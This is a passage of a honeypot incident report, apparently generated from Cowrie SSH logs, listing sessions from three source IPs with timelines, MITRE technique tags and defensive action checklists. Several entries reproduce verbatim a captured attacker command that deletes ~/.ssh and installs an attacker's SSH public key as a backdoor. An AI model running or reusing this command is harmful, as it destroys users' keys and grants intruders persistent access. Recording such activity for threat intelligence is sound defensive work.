| `2026-04-10 19:39:29` | `cowrie.command.failed` |
| `2026-04-10 19:39:29` | `cowrie.log.closed` |
| `2026-04-10 19:39:30` | `cowrie.session.params` |
| `2026-04-10 19:39:30` | `cowrie.command.input` |
| `2026-04-10 19:39:30` | `cowrie.session.file_download` |
| `2026-04-10 19:39:30` | `cowrie.log.closed` |
| `2026-04-10 19:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f10736ece2

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:39 |
| **Last Seen** | 2026-04-10 19:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:39:32` | `cowrie.session.connect` |
| `2026-04-10 19:39:32` | `cowrie.client.version` |
| `2026-04-10 19:39:32` | `cowrie.client.kex` |
| `2026-04-10 19:39:32` | `cowrie.login.success` |
| `2026-04-10 19:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7c6eb826f1

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:41 |
| **Last Seen** | 2026-04-10 19:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:41:21` | `cowrie.session.connect` |
| `2026-04-10 19:41:21` | `cowrie.client.version` |
| `2026-04-10 19:41:22` | `cowrie.client.kex` |
| `2026-04-10 19:41:22` | `cowrie.login.success` |
| `2026-04-10 19:41:22` | `cowrie.session.params` |
| `2026-04-10 19:41:22` | `cowrie.command.input` |
| `2026-04-10 19:41:22` | `cowrie.command.failed` |
| `2026-04-10 19:41:22` | `cowrie.log.closed` |
| `2026-04-10 19:41:23` | `cowrie.session.params` |
| `2026-04-10 19:41:23` | `cowrie.command.input` |
| `2026-04-10 19:41:23` | `cowrie.session.file_download` |
| `2026-04-10 19:41:23` | `cowrie.log.closed` |
| `2026-04-10 19:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed3f672c45c

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:41 |
| **Last Seen** | 2026-04-10 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:41:25` | `cowrie.session.connect` |
| `2026-04-10 19:41:25` | `cowrie.client.version` |
| `2026-04-10 19:41:25` | `cowrie.client.kex` |
| `2026-04-10 19:41:26` | `cowrie.login.success` |
| `2026-04-10 19:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9805e7e5dcd7

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:42 |
| **Last Seen** | 2026-04-10 19:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:42:56` | `cowrie.session.connect` |
| `2026-04-10 19:42:56` | `cowrie.client.version` |
| `2026-04-10 19:42:57` | `cowrie.client.kex` |
| `2026-04-10 19:42:57` | `cowrie.login.success` |
| `2026-04-10 19:42:57` | `cowrie.session.params` |
| `2026-04-10 19:42:57` | `cowrie.command.input` |
| `2026-04-10 19:42:57` | `cowrie.command.failed` |
| `2026-04-10 19:42:57` | `cowrie.log.closed` |
| `2026-04-10 19:42:58` | `cowrie.session.params` |
| `2026-04-10 19:42:58` | `cowrie.command.input` |
| `2026-04-10 19:42:58` | `cowrie.session.file_download` |
| `2026-04-10 19:42:58` | `cowrie.log.closed` |
| `2026-04-10 19:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d75f950813

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:43 |
| **Last Seen** | 2026-04-10 19:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:43:00` | `cowrie.session.connect` |
| `2026-04-10 19:43:00` | `cowrie.client.version` |
| `2026-04-10 19:43:00` | `cowrie.client.kex` |
| `2026-04-10 19:43:00` | `cowrie.login.success` |
| `2026-04-10 19:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fbe741c787

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:44 |
| **Last Seen** | 2026-04-10 19:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:44:39` | `cowrie.session.connect` |
| `2026-04-10 19:44:39` | `cowrie.client.version` |
| `2026-04-10 19:44:39` | `cowrie.client.kex` |
| `2026-04-10 19:44:40` | `cowrie.login.success` |
| `2026-04-10 19:44:40` | `cowrie.session.params` |
| `2026-04-10 19:44:40` | `cowrie.command.input` |
| `2026-04-10 19:44:40` | `cowrie.command.failed` |
| `2026-04-10 19:44:40` | `cowrie.log.closed` |
| `2026-04-10 19:44:40` | `cowrie.session.params` |
| `2026-04-10 19:44:40` | `cowrie.command.input` |
| `2026-04-10 19:44:40` | `cowrie.session.file_download` |
| `2026-04-10 19:44:40` | `cowrie.log.closed` |
| `2026-04-10 19:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732a86d7952a

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:44 |
| **Last Seen** | 2026-04-10 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:44:42` | `cowrie.session.connect` |
| `2026-04-10 19:44:42` | `cowrie.client.version` |
| `2026-04-10 19:44:42` | `cowrie.client.kex` |
| `2026-04-10 19:44:43` | `cowrie.login.success` |
| `2026-04-10 19:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8a72d68d595

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:46 |
| **Last Seen** | 2026-04-10 19:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:46:31` | `cowrie.session.connect` |
| `2026-04-10 19:46:31` | `cowrie.client.version` |
| `2026-04-10 19:46:31` | `cowrie.client.kex` |
| `2026-04-10 19:46:32` | `cowrie.login.success` |
| `2026-04-10 19:46:32` | `cowrie.session.params` |
| `2026-04-10 19:46:32` | `cowrie.command.input` |
| `2026-04-10 19:46:32` | `cowrie.command.failed` |
| `2026-04-10 19:46:32` | `cowrie.log.closed` |
| `2026-04-10 19:46:32` | `cowrie.session.params` |
| `2026-04-10 19:46:32` | `cowrie.command.input` |
| `2026-04-10 19:46:32` | `cowrie.session.file_download` |
| `2026-04-10 19:46:32` | `cowrie.log.closed` |
| `2026-04-10 19:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad047ea4b240

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:46 |
| **Last Seen** | 2026-04-10 19:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:46:33` | `cowrie.session.connect` |
| `2026-04-10 19:46:33` | `cowrie.client.version` |
| `2026-04-10 19:46:33` | `cowrie.client.kex` |
| `2026-04-10 19:46:34` | `cowrie.login.success` |
| `2026-04-10 19:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154c897a849f

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:46 |
| **Last Seen** | 2026-04-10 19:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:46:58` | `cowrie.session.connect` |
| `2026-04-10 19:46:58` | `cowrie.client.version` |
| `2026-04-10 19:46:59` | `cowrie.client.kex` |
| `2026-04-10 19:46:59` | `cowrie.login.success` |
| `2026-04-10 19:46:59` | `cowrie.session.params` |
| `2026-04-10 19:46:59` | `cowrie.command.input` |
| `2026-04-10 19:46:59` | `cowrie.command.failed` |
| `2026-04-10 19:47:00` | `cowrie.log.closed` |
| `2026-04-10 19:47:00` | `cowrie.session.params` |
| `2026-04-10 19:47:00` | `cowrie.command.input` |
| `2026-04-10 19:47:00` | `cowrie.session.file_download` |
| `2026-04-10 19:47:00` | `cowrie.log.closed` |
| `2026-04-10 19:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd79c2fb45e7

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:47 |
| **Last Seen** | 2026-04-10 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:47:02` | `cowrie.session.connect` |
| `2026-04-10 19:47:02` | `cowrie.client.version` |
| `2026-04-10 19:47:02` | `cowrie.client.kex` |
| `2026-04-10 19:47:03` | `cowrie.login.success` |
| `2026-04-10 19:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e8f3d6ba5a8

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:48 |
| **Last Seen** | 2026-04-10 19:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:48:28` | `cowrie.session.connect` |
| `2026-04-10 19:48:28` | `cowrie.client.version` |
| `2026-04-10 19:48:28` | `cowrie.client.kex` |
| `2026-04-10 19:48:28` | `cowrie.login.success` |
| `2026-04-10 19:48:28` | `cowrie.session.params` |
| `2026-04-10 19:48:28` | `cowrie.command.input` |
| `2026-04-10 19:48:28` | `cowrie.command.failed` |
| `2026-04-10 19:48:29` | `cowrie.log.closed` |
| `2026-04-10 19:48:29` | `cowrie.session.params` |
| `2026-04-10 19:48:29` | `cowrie.command.input` |
| `2026-04-10 19:48:29` | `cowrie.session.file_download` |
| `2026-04-10 19:48:29` | `cowrie.log.closed` |
| `2026-04-10 19:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff9c4bd6252

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:48 |
| **Last Seen** | 2026-04-10 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:48:30` | `cowrie.session.connect` |
| `2026-04-10 19:48:30` | `cowrie.client.version` |
| `2026-04-10 19:48:30` | `cowrie.client.kex` |
| `2026-04-10 19:48:31` | `cowrie.login.success` |
| `2026-04-10 19:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-856c4ecc2919

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:49 |
| **Last Seen** | 2026-04-10 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:49:49` | `cowrie.session.connect` |
| `2026-04-10 19:49:49` | `cowrie.client.version` |
| `2026-04-10 19:49:49` | `cowrie.client.kex` |
| `2026-04-10 19:49:50` | `cowrie.login.success` |
| `2026-04-10 19:49:50` | `cowrie.session.params` |
| `2026-04-10 19:49:50` | `cowrie.command.input` |
| `2026-04-10 19:49:50` | `cowrie.command.failed` |
| `2026-04-10 19:49:50` | `cowrie.log.closed` |
| `2026-04-10 19:49:50` | `cowrie.session.params` |
| `2026-04-10 19:49:50` | `cowrie.command.input` |
| `2026-04-10 19:49:51` | `cowrie.session.file_download` |
| `2026-04-10 19:49:51` | `cowrie.log.closed` |
| `2026-04-10 19:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a917ab1bafe8

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:49 |
| **Last Seen** | 2026-04-10 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:49:52` | `cowrie.session.connect` |
| `2026-04-10 19:49:52` | `cowrie.client.version` |
| `2026-04-10 19:49:53` | `cowrie.client.kex` |
| `2026-04-10 19:49:53` | `cowrie.login.success` |
| `2026-04-10 19:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0d2a2a4139f

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:52 |
| **Last Seen** | 2026-04-10 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:52:15` | `cowrie.session.connect` |
| `2026-04-10 19:52:15` | `cowrie.client.version` |
| `2026-04-10 19:52:15` | `cowrie.client.kex` |
| `2026-04-10 19:52:16` | `cowrie.login.success` |
| `2026-04-10 19:52:16` | `cowrie.session.params` |
| `2026-04-10 19:52:16` | `cowrie.command.input` |
| `2026-04-10 19:52:16` | `cowrie.command.failed` |
| `2026-04-10 19:52:16` | `cowrie.log.closed` |
| `2026-04-10 19:52:16` | `cowrie.session.params` |
| `2026-04-10 19:52:16` | `cowrie.command.input` |
| `2026-04-10 19:52:16` | `cowrie.session.file_download` |
| `2026-04-10 19:52:16` | `cowrie.log.closed` |
| `2026-04-10 19:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaadfeadcdff

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:52 |
| **Last Seen** | 2026-04-10 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:52:17` | `cowrie.session.connect` |
| `2026-04-10 19:52:17` | `cowrie.client.version` |
| `2026-04-10 19:52:17` | `cowrie.client.kex` |
| `2026-04-10 19:52:18` | `cowrie.login.success` |
| `2026-04-10 19:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

